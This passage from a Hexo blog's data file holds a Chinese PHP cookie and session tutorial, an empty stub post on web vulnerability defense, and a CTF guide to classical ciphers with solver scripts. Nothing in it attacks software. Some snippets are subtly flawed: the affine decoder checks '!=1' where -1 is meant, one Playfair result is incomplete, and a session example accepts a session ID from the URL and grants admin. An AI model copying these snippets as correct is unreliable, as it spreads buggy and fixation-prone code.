s.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<p>[toc]</p>\n<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><p>cookie是一种服务端配置在用户电脑上的小文件，用于保存用户信息。因为http(s)是无连接的，所以服务器没法记住同一个用户，从用户的cookie中获取一定的信息（主要用于识别用户），能够帮助服务端处理请求以及提升用户体验。</p>\n<p>PHP能够创建或取回cookie的值</p>\n<h2 id=\"创建cookie\"><a href=\"#创建cookie\" class=\"headerlink\" title=\"创建cookie\"></a>创建cookie</h2><p>setcookie()（或setrawcookie()）用于创建cookie</p>\n<pre><code class=\"php\">setcookie(name,value,expire,path,domain);</code></pre>\n<p>实例1：</p>\n<pre><code class=\"php+HTML\">&lt;?php\nsetcookie(&#39;user&#39;,&#39;Li&#39;,time()+3600);    //设置user的值为&#39;Li&#39;,在一小时后过期\n?&gt;\n&lt;html&gt;\n  ...\n&lt;/html&gt;</code></pre>\n<p>发送cookie时会自动对 cookie值进行url编码，读取时会自动解码，如果不要进行url编码，就可以使用setrawcookie()函数</p>\n<p>实例 2:</p>\n<p>还可以通过另一种方式设置 cookie 的过期时间。这也许比使用秒表示的方式简单。</p>\n<pre><code class=\"php+HTML\">&lt;?php\n$expire=time()+60*60*24*30;\nsetcookie(&quot;user&quot;, &quot;runoob&quot;, $expire);\n?&gt;\n\n&lt;html&gt;\n  ...  \n&lt;/html&gt;</code></pre>\n<h2 id=\"读取cookie值\"><a href=\"#读取cookie值\" class=\"headerlink\" title=\"读取cookie值\"></a>读取cookie值</h2><p> $_COOKIE 变量用于取回 cookie 的值。</p>\n<pre><code class=\"php+HTML\">&lt;?php\nif(isset($_COOKIE[&#39;user&#39;]))    //用isset()函数来判断是否设置了名为&#39;user&#39;的cookie\n{\n    $user=$_COOKIE[&#39;user&#39;];    //读取user的值\n    echo &#39;欢迎&#39;.$user.&#39;！&lt;/br&gt;&#39;;\n}\nelse\n{\n    echo &#39;欢迎，游客！&#39;\n}\nprint_r($_COOKIE);    //输出所有cookie值</code></pre>\n<h2 id=\"删除-Cookie？\"><a href=\"#删除-Cookie？\" class=\"headerlink\" title=\"删除 Cookie？\"></a>删除 Cookie？</h2><p>当删除 cookie 时，只要使过期日期变更为过去的时间点。</p>\n<p>删除的实例：</p>\n<pre><code class=\"php\">&lt;?php\n// 设置 cookie 过期时间为过去 1 小时\nsetcookie(&quot;user&quot;, &quot;Li&quot;, time()-3600);\n?&gt;</code></pre>\n<h1 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h1><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>\n<p>还是由于http(s)无连接的原因，当用户进行了一次操作以后，一般来说，web服务器并不能记住用户，如果用户需要连续，连贯的操作，就会很难受。而通过在服务器上储存session信息来记录用户本次“会话”的临时信息（用户名，身份信息，行为等），可以让服务器知道用户是谁以及做了什么。</p>\n<p>Session信息是临时的，在用户离开网站后就会销毁，需要保存的信息只能储存在数据库中</p>\n<p><strong>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</strong></p>\n<h2 id=\"开始Session\"><a href=\"#开始Session\" class=\"headerlink\" title=\"开始Session\"></a>开始Session</h2><pre><code class=\"php+HTML\">&lt;?php\nsession_start(); \n?&gt;\n\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n<p>注意：session_start()函数必须在<html>标签之前。</html></p>\n<h2 id=\"储存和读取session\"><a href=\"#储存和读取session\" class=\"headerlink\" title=\"储存和读取session\"></a>储存和读取session</h2><h2 id=\"销毁-Session\"><a href=\"#销毁-Session\" class=\"headerlink\" title=\"销毁 Session\"></a>销毁 Session</h2><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>\n<p>unset() 函数用于释放指定的 session 变量：</p>\n<p><strong>实例</strong></p>\n<pre><code class=\"php\">&lt;?php \n    session_start(); \n    if(isset($_SESSION[&#39;views&#39;]))\n    {    \n        unset($_SESSION[&#39;views&#39;]);\n    } \n?&gt;</code></pre>\n<p>也可以通过调用 session_destroy() 函数<strong>彻底销毁</strong> session：</p>\n<p><strong>实例</strong></p>\n<pre><code class=\"php\">&lt;?php \n    session_destroy(); \n?&gt;</code></pre>\n<h1 id=\"Cookie和Session\"><a href=\"#Cookie和Session\" class=\"headerlink\" title=\"Cookie和Session\"></a>Cookie和Session</h1><p>cookie储存在用户计算机中且可查询可更改，session处在网站服务器中可见但不可随意更改，从这个角度来说，session比cookie更加安全”一些“。</p>\n<p>但session不能完全取代cookie的作用，只有session和cookie一起使用才能带来最高的效率。将一些消息保存在用户端以提高便利性，将一些信息保存在服务端以保证安全性和完整性。</p>\n<p>一般来说，用cookie来储存session ID，以帮助服务器实别用户。</p>\n<p>session ID即服务器中保存的session文件的名字，一般形如这样：sess_4c83638b3b0dbf65583181c2f89168ec（后面是32位编码的随机字符，也正是session ID）。这样，当用户第一次访问服务器，服务器生成一个唯一的随机的session ID，并放进一个cookie里发送给客户端，客户端再访问服务器时就会自动带着这个cookie，服务器就能识别用户并找到对应session文件里的信息了（现在还有一种机制叫token，跟这个机制很像，但也有一定的不同，以后单独再开篇文章记录）</p>\n<p>以上是客户端开启了cookie服务的情况，如果客户端禁用了cookie，就需要服务器（服务器会判断客户端是否开启了cookie）在url中添加session ID来实现session的传输，</p>\n<p>形如 ：<a href=\"http://www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec\" target=\"_blank\" rel=\"noopener\">www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec</a></p>\n<pre><code class=\"php\">&lt;?php\n//  保存一天\n$lifeTime = 24 * 3600;\n//  取得当前 Session 名，默认为 PHPSESSID\n$sessionName = session_name();\n//  取得 Session ID\n$sessionID = $_GET[$sessionName];\n//  使用 session_id() 设置获得的 Session ID\nsession_id($sessionID);\n\nsession_set_cookie_params($lifeTime);\nsession_start();\n$_SESSION[&#39;admin&#39;] = true;\n?&gt;</code></pre>\n<p>或者使用隐藏表单来传输session，自动在表单中添加一个属性为”hidden”的<input>,里面提交的是服务器为用户生成的session值。</p>\n<pre><code class=\"html\">&lt;input type=&quot;hidden&quot; name=&quot;PHPSESSID&quot; value=&quot;4c83638b3b0dbf65583181c2f89168ec&quot;&gt;</code></pre>\n"},{"layout":"post","title":"web常见漏洞防御基本原理","date":"2020-10-11T16:00:00.000Z","description":"你挖你🐎的漏洞呢？！","_content":"\n# web常见漏洞防御基本原理\n\n咕咕咕~","source":"_posts/2020-10-12-web常见漏洞防御基本原理.md","raw":"---\nlayout: post\ntitle: web常见漏洞防御基本原理\ndate: 2020-10-12\ncategories: blog\ntags: [web,漏洞]\ndescription: 你挖你🐎的漏洞呢？！\n---\n\n# web常见漏洞防御基本原理\n\n咕咕咕~","slug":"2020-10-12-web常见漏洞防御基本原理","published":1,"updated":"2020-11-11T08:48:02.921Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jh000hxov7csuzazax","content":"<h1 id=\"web常见漏洞防御基本原理\"><a href=\"#web常见漏洞防御基本原理\" class=\"headerlink\" title=\"web常见漏洞防御基本原理\"></a>web常见漏洞防御基本原理</h1><p>咕咕咕~</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"web常见漏洞防御基本原理\"><a href=\"#web常见漏洞防御基本原理\" class=\"headerlink\" title=\"web常见漏洞防御基本原理\"></a>web常见漏洞防御基本原理</h1><p>咕咕咕~</p>\n"},{"title":"古典密码从0到1","date":"2020-10-01T16:00:00.000Z","description":"白嫖的文章改的。","_content":"\n[toc]\n\n# 古典密码从0到1\n\n**![img](https://pic1.zhimg.com/80/v2-f483400333b7ccaa8689e9cfc0c3e8dc_720w.jpg)**\n\n## **古典密码和现代密码的区别：**\n\n古典密码是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。\n\n现代的方法是用电脑或是其它数字科技，基于比特和字节上操作。许多经典密码被受尊重的人使用，像是尤利乌斯·凯撒和拿破仑，他们创造了一些常被人们使用的密码。许多密码起源于军事上，相同立场的人常使用来寄送秘密消息。经典的方法常攻击密码文，有时候甚至不知其密码系统，也可以使用工具，像是频率分析法。有些经典密码是使用先进的机器或是机电密码机器，像是恩尼格玛密码机。                           ---维基\n\n其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：\n\n单表替换加密（Monoalphabetic Cipher）\n\n多表替换加密（Polyalphabetic Cipher）\n\n奇奇怪怪的加密方式                                             --ctf wiki\n\n\n\n## **凯撒密码：**\n\n​\t凯撒曾经使用这种密码与其将军们来联系，所以用凯撒来命名这种密码。\n\n根据图片来了解加密原理。凯撒密码一般适用于26个英文字母。根据偏移量来进行加密。如图所示，当偏移量=3。即是A-D,B-E。\n\n![img](https://pic2.zhimg.com/80/v2-ab311b6e604849f12c19e5e96818a925_720w.jpg)\n\n​\t把字母转成数学，数学公式如下。\n\n![img](https://pic1.zhimg.com/80/v2-f77f29985ee9014f3df11575682ac180_720w.jpg)\n\n### **在线加解密网站：**\n\n[https://www.qqxiuzi.cn/bianma/kaisamima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/kaisamima.php)\n\n[http://www.metools.info/code/c70.html](https://link.zhihu.com/?target=http%3A//www.metools.info/code/c70.html)\n\n[http://www.atoolbox.net/Tool.php?Id=778](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D778)\n\n## **仿射密码：**\n\n数学加密公式：\n\n![img](https://pic3.zhimg.com/80/v2-1a7aeab7e90203fc056e398344ce2b7a_720w.jpg)\n\n\n\n仿射密码中解密需要用到求逆元\n\n直接给出python解密脚本：\n\n```text\nimport primefac\ndef affine_decode(c,a,b,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    r=\"\"\n    n=len(origin)\n    ai=primefac.modinv(a,n)%n\n    for i in c:\n        if origin.find(i)!=1:\n            r+=origin[(ai*(origin.index(i)-b))%n]\n        else:\n            r+=i\n    return r\nprint affine_decode(\"ihhwvcswfrcp\",5,8)\n\ndef affine_guessab(m1,c1,m2,c2,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    x1=origin.index(m1)\n    x2=origin.index(m2)\n    y1=origin.index(c1)\n    y2=origin.index(c2)\n    n=len(origin)\n    dxi=primefac.modinv(x1-x2,n)%n\n    a=dxi*(y1-y2) % n\n    b=(y1-a*x1)%n\n    return a,b\nprint affine_guessab(\"a\",\"i\",\"f\",\"h\")\n```\n\n\n\n### 仿射密码在线加解密网站：\n\n[http://www.atoolbox.net/Tool.php?Id=911](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D911)\n\n##### 仿射密码真题-one：\n\nBuuctf- Crypto-[GKCTF2020]小学生的密码学\n\ne(x)=11x+6(mod26)\n\n密文：welcylk\n\n（flag为base64形式）\n\n\n\n![img](https://pic4.zhimg.com/80/v2-cf93192b800a57815bc7b5c050f8c673_720w.jpg)\n\n![img](https://pic2.zhimg.com/80/v2-b9d84b6e31edf9ebe9931c5174eba819_720w.jpg)\n\n\n\n## **四方密码：**\n\n四方密码是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。\n\n这种方法将字母两个一组，然后采用多字母替换密码。\n\n四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。\n\n\n\n选两个密钥，example和keyword。去掉重复的字母。就是example变成exampl。余下的字母顺序存入矩阵即可\n\n加密矩阵放右上和左下。\n\n![img](https://pic1.zhimg.com/80/v2-7f9734b21e0caee6689d77d9de7e1b6c_720w.jpg)\n\n加密步骤。把字符串按两个字母一组分开\n\nHelloworld\n\nHe ll ow or ld\n\n找第一组第一个字母在左上角矩阵的位置：\n\n![img](https://pic3.zhimg.com/80/v2-c210fedc80540995f608f795a073acda_720w.jpg)\n\n找第一组第二个字母在右下角矩阵的位置：\n\n![img](https://pic1.zhimg.com/80/v2-165d0ff7602b3b7801cd2e050cc948e0_720w.jpg)\n\n先找和一个字母同横的，和第二个字母同直的\n\n![img](https://pic1.zhimg.com/80/v2-9df900be2dee2b0602d420ff290a5adc_720w.jpg)\n\n第一个字母同直，第二个字母同横的\n\n![img](https://pic4.zhimg.com/80/v2-01dc7c7890019f58beef4ade3bd5eab7_720w.jpg)\n\n得到he加密后为FY\n\n如此可得接下来，最后就是\n\nhe lp me ob iw an ke no bi\n\nFY GM KY HO BX MF KK KI MD\n\n##### 四方密码真题-one：\n\nBuuctf-crypo-四面八方\n\n四方密码：\n\nwiki上了解四方密码如何加解密的一个过程\n\n[https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC](https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC)\n\n密钥存阵\n\n通常在题目中会给定2个密钥，我们要去掉Q或者把I和J当成一个。按照26个英文字母。秘钥中出现的不填。补充成5*5的矩阵\n\n![img](https://pic4.zhimg.com/80/v2-bf5760187447c0cdd17602207d2b8453_720w.jpg)\n\n这题直接填充即可\n\nsecurityabdfghjklmnopvwxz\n\nsecurityadbfghjklmnopvwxz\n\nabcdefghijklmnopqrstuvwxyz\n\n\n\ninformatn\n\ninformatbcdeghjklpsuvwxyz\n\nabcdefghijklmnopqrstuvwxyz\n\n### **在线解密工具：**\n\n[http://ctf.ssleye.com/four.html](https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html)\n\n根据题目说的解出来的语句是个通顺的句子，那肯定排序就有点问题\n\n![img](https://pic1.zhimg.com/80/v2-6dfcefe68d59545916e53be11cfebb3c_720w.jpg)\n\n**接下来可以拿出词频分析。**\n\n这边分割可以多试试。可以看出来个success，其他位置试\n\n**[https://quipqiup.com/](https://link.zhihu.com/?target=https%3A//quipqiup.com/)**\n\n![img](https://pic3.zhimg.com/80/v2-8a82b177919a7e61bcc1d84ff940acb2_720w.jpg)\n\n\n\n### 四方密码在线加解密网站：\n\n[http://ctf.ssleye.com/four.html](https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html)\n\n## **培根密码：**\n\n培根密码直接根据表中的字母进行转换。\n\n密文一般只含有a和b字母\n\n![img](https://pic1.zhimg.com/80/v2-9e23a167e68739049ecb21cdde085a98_720w.jpg)\n\n培根密码在线解密：\n\n[https://tool.bugku.com/peigen/](https://link.zhihu.com/?target=https%3A//tool.bugku.com/peigen/)\n\n培根密码真题-one：\n\n攻防世界crypto新手-不仅仅是morse\n\n![img](https://pic4.zhimg.com/80/v2-bc8cc8808aa0560f4811c4e0c2283a3f_720w.jpg)\n\n把/转换成空格。直接拿出morse解密\n\n![img](https://pic3.zhimg.com/80/v2-7712dc9ce03f0cbad6f2e3cf68b19062_720w.jpg)\n\n在看后面一段像培根密码，根据题目提示是食物加密。\n\n![img](https://pic2.zhimg.com/80/v2-8f60398906141bf4062ade9faa45787d_720w.jpg)\n\n\n\n## **标准银河字母：**\n\n标准银河字母（Standard Galactic Alphabet）出自游戏《指挥官基恩》系列。是系列中使用的书写系统。这是一个简单的替代暗号，用不同的符号取代拉丁字母。SGA可以在不同的语言中使用，比如在游戏《Minecraft》，《指挥官基恩》中。\n\n如果遇到这类题。直接根据题目来进行图翻->字母\n\n![img](https://pic3.zhimg.com/80/v2-ba0f6c12d8d4c71bc1f36c0faa472272_720w.jpg)\n\n## **圣堂武士密码：**\n\n圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种,一直被共济会圣殿骑士用。\n\n直接根据图片上的直接翻译出字母即可\n\n![img](https://pic1.zhimg.com/80/v2-1fbce927928b8189a662418fa9655394_720w.jpg)\n\n## **猪圈密码：**\n\n猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。\n\n直接图片替换字母即可\n\n![img](https://pic4.zhimg.com/80/v2-c20685d002fe2653944302a1c12a5327_720w.jpg)\n\n\n\n\n\n### **猪圈密码在线解密网站：**\n\n[http://www.metools.info/code/c90.html](https://link.zhihu.com/?target=http%3A//www.metools.info/code/c90.html)\n\n猪圈密码真题：\n\nBuuctf-crypto-萌萌哒的八戒\n\n![img](https://pic4.zhimg.com/80/v2-64cefda059f2f55f522ad0ca6e81f74f_720w.jpg)\n\n\n\n直接解密\n\n![img](https://pic4.zhimg.com/80/v2-87186735e3b7ee8e57ca015e5cecddd3_720w.jpg)\n\n\n\n猪圈密码-圣堂武士密码-标准银河字母-栅栏密码真题：\n\nBuuctf-Crypto- [MRCTF2020]古典密码知多少\n\n![img](https://pic4.zhimg.com/80/v2-52004a0174178967f87f54236b8d01bf_720w.jpg)\n\n![img](https://pic1.zhimg.com/80/v2-1b31253a3056562005cb5f6ac911ed30_720w.jpg)\n\n图上的蓝色就是猪圈密码，橙色的是圣堂武士密码，黑色的是银河字母。\n\n![img](https://pic3.zhimg.com/80/v2-61739e1b2e5a4eed51c7bf7abb7a3f26_720w.jpg)\n\n![img](https://pic2.zhimg.com/80/v2-c7a82d3ea6d815257627ee9273676061_720w.jpg)\n\n\n\n## **当铺密码：**\n\n当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：\n\n口 0\t田 0\t由 1\t中 2\t人 3\t工 4\n\n大 5\t王 6\t夫 7\t井 8\t羊 9\n\n具体映射可查看：\n\n[https://www.cnblogs.com/cc11001100/p/9357263.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/cc11001100/p/9357263.html)\n\n当铺密码真题：\n\nBuuctf-crypto-GKCTF2020汉字的秘密\n\n![img](https://pic2.zhimg.com/80/v2-9abe603c0eef1e0746f91ec04dc24aad_720w.jpg)\n\n![img](https://pic4.zhimg.com/80/v2-fb9478ec0839e5017f8cd83cef8bfbb7_720w.jpg)\n\n直接解码发现不对。\n\n![img](https://pic4.zhimg.com/80/v2-65054bc4d94d218e47c6b7229e799357_720w.jpg)\n\n翻看ascii码。改进一下脚本：\n\n自己猜一下flag开头为flag。可以看到ascii嘛每一位都是递增的。\n\n差为1,2,3,4\n\n![img](https://pic3.zhimg.com/80/v2-f2ccb7e18e9b325dc067e5d977740536_720w.jpg)\n\n## **跳舞的小人密码：**\n\n跳舞的人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。\n\n这题直接根据表来进行转换即可。加解密同\n\n![img](https://pic1.zhimg.com/80/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg)\n\n这题感觉是做过的。但没翻到例题。就不放了。\n\n## **希尔密码（hill）：**\n\n希尔密码（Hill Cipher）是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。每个字母当作26进制数字：A=0, B=1, C=2... 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。\n\n直接给出网上的脚本可以参考：\n\n```text\nimport numpy as np\n\nm = 'YOURPINNOISFOURONETWOSIX'  #明文\na = np.matrix([[11,2,19],[5,23,25],[20,7,17]])  #密钥LCTFXZUHR\nnum_m = []\ntemp = []\ncount = 1\nfor i in m:  #将明文分为三个一组\n    temp.append(ord(i)-ord('A'))\n    if count % 3 == 0:\n        num_m.append(temp)\n        temp = []\n    count += 1\nmat_m = [np.matrix(i).T for i in num_m]  #将明文分组转换为向量形式\nmat_c = [a * i % 26 for i in mat_m]  #得到密文分组的向量形式\nnum_c = []\ntemp = []\nfor i in mat_c:  #将密文向量转换为列表形式，且合并到一个列表\n    temp = i.tolist()\n    for j in range(3):\n        num_c.append(temp[j][0])\nc = [chr(i+ord('A')) for i in num_c]\nprint(''.join(c))  #连接成字符串,输出密文\n```\n\n### **希尔密码在线加解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=914](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D914)\n\n## **维吉尼亚密码：**\n\n维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。\n\n维吉尼亚加解密表格：\n\n![img](https://pic2.zhimg.com/80/v2-0256b1f8fe704260074c03e4b2696ef5_720w.jpg)\n\n当明文为\n\nATTACKATDAWN\n\n\n\n选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：\n\nLEMONLEMONLE\n\n\n\n对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：\n\n\n\n明文：ATTACKATDAWN\n\n密钥：LEMONLEMONLE\n\n密文：LXFOPVEFRNHR\n\n### **维吉尼亚密码在线加解密：**\n\n[https://www.qqxiuzi.cn/bianma/weijiniyamima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/weijiniyamima.php)\n\n\n\n维吉尼亚密码真题-one：\n\nBUUCTF-Crypto-[BJDCTF 2nd]燕言燕语-y1ng\n\n小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:\n\n79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20\n\n16进制转字符串\n\n![img](https://pic1.zhimg.com/80/v2-8a3764498e3bbb3b136a4ff59ac70ba0_720w.jpg)\n\n\n\n维吉尼亚在线直接解\n\n![img](https://pic3.zhimg.com/80/v2-2aa851be441a5f864a0b1306eac29392_720w.jpg)\n\n## **棋盘密码（Polybius）：**\n\n波利比奥斯棋盘（Polybius Checkerboard）是棋盘密码的一种，是利用波利比奥斯方阵(Polybius  Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。\n\n借鉴知乎上的图\n\n![img](https://pic3.zhimg.com/80/v2-095ef336986fd39db6580115c3a78792_720w.jpg)\n\n\n\n先看纵向，在看横向。得到密文\n\n明文HELLO 密文：23 15 31 31 34\n\n## **普莱费尔密码（playfair）：**\n\n选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将Q去除，或将I和J视作同一字。）\n\n将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。若剩下一个字，也加入X字。\n\n在每组中，找出两个字母在矩阵中的地方。\n\n若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角。\n\n若两个字母在同一横列，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。\n\n若两个字母在同一直行，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。\n\n\n\n取playfair example为密钥。即可得到表\n\nP L A Y F\n\nI R E X M\n\nB C D G H\n\nK N O Q S\n\nT U V W Z\n\n需要加密的为Hide the gold\n\nHI DE TH EG OL\n\n加密后为\n\nBM OD ZB XD\n\n### **在线普莱费尔加解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=912](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D912)\n\n[http://rumkin.com/tools/cipher/playfair.php](https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php)\n\n\n\n普莱费尔真题-one：\n\nBuuctf-crypto-cipher\n\n还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}\n\n[http://rumkin.com/tools/cipher/playfair.php](https://link.zhihu.com/?target=http%3A//rumkin.com/tools/cipher/playfair.php)\n\n![img](https://pic2.zhimg.com/80/v2-2be2d0bcb297711754a46296432e8f3d_720w.jpg)\n\n## **Nihilist密码：**\n\nNihilist跟polybius密码差不多\n\n相同的先看纵向，在看横向。\n\n例如a=[2,3]=23\n\n![img](https://pic2.zhimg.com/80/v2-929026378b34e6fd342567e8adf92a2d_720w.jpg)\n\n## **Keyboard密码：**\n\nKeyboard密码在ctf中应该是分多种类型的。这里提两种。即9键表和26键包含\n\n9键表就是通过九键上多次字母来进行字母提取\n\n26键包含通过明文多个字符对应一个密文\n\n9键表真题：\n\n直接放两道题来理解\n\nBuuctf- Crypto-[NCTF2019]Keyboard\n\n![img](https://pic1.zhimg.com/80/v2-7ab75ce548f7ec78fb0dcc1c305d78b8_720w.jpg)\n\n\n\n分析第一个字符串，ooo，o在键盘上对应的是9，有3个o，表示第9个格子的第三个字母，就是y。那yyy就是指字母o\n\n![img](https://pic1.zhimg.com/80/v2-5579f6bceb2f7b7be87c13a30ae19628_720w.jpg)\n\ncipher=\"ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee\"\n\nbase=\" qwertyuiop\"\n\na=[\" \",\" \",\"abc\",\"def\",\"ghi\",\"jkl\",\"mno\",\"pqrs\",\"tuv\",\"wxyz\"]\n\n\\#print(base.index(\"q\"))\n\nfor part in cipher.split(\" \"):\n\n  s=base.index(part[0])\n\n  count=len(part)\n\n  \\#print(a[9][2],end=\"\")\n\n  